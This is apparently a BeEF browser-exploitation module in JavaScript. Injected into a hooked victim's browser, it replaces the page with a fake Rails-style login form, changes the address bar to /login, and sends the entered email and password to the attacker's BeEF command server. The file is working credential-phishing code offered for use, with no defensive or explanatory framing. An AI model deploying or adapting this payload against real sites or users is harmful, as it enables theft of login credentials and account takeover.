function prependScript(script) {
  $('head').append(script)
}

submittedLogin = `
  <script>
  function submittedLogin(){
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "Email: "   + document.getElementById('email').value);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "Password: " + document.getElementById('password').value);
    return false;
  }
  </script>
`;

fakeLoginBody = `
<div class=container><nav class="bg-faded navbar navbar-light navbar-toggleable-md"><a class=navbar-brand href=/ >Home</a><div class="collapse navbar-collapse"id=navbarSupportedContent><ul class="navbar-nav mr-auto"></ul><ul class=navbar-nav><li class=nav-item><a class=nav-link href=/users/sign_in>Log In</a><li class=nav-item><a class=nav-link href=/users/sign_up>Sign up</a></ul></div></nav><div class="row mt-2"><div class=col-1></div><div class=col-10><div class="alert alert-danger alert-dismissible fade show"role=alert><button aria-label=Close class=close data-dismiss=alert type=button><span aria-hidden=true>×</span></button> <%= @logout_notice %></div></div></div><div class=row><div class=col><h1>Log In</h1></div></div><div class=row><div class=col><div class=row><div class=col-4><form onsubmit="return false;" class=new_user id=new_user role=form><input name=utf8 type=hidden value=✓> <input name=authenticity_token type=hidden value="GLV1tmw/Bl2ixyCmoFJDlYO0MRjy01nFyuIkoUQly0I3dFnIR2vh9BN6Zd3AVyAJuUKEB59ZWVgCnb/EbV5dAw=="><div class=form-group><label for=email class="control-label required">Email</label><input name=email type=email class=form-control autofocus id=email></div><div class=form-group><label for=password class="control-label required">Password</label><input name=password type=password class=form-control id=password autocomplete=off></div><div class=checkbox><label for=user_remember_me><input name=user[remember_me] type=hidden value=0> <input name=user[remember_me] type=checkbox value=1 id=user_remember_me> Remember me</label></div><button onclick="submittedLogin()" name=commit type=submit value="Log in"class="btn btn-default btn-primary"data-disable-with="Log in">Log in</button></form></div></div></div></div></div>
`;


function show_login() {
  prependScript(submittedLogin);
  $('body').html(fakeLoginBody);
  history.pushState({}, 'Login', '/login');
}

beef.execute(function() {
  show_login();
});
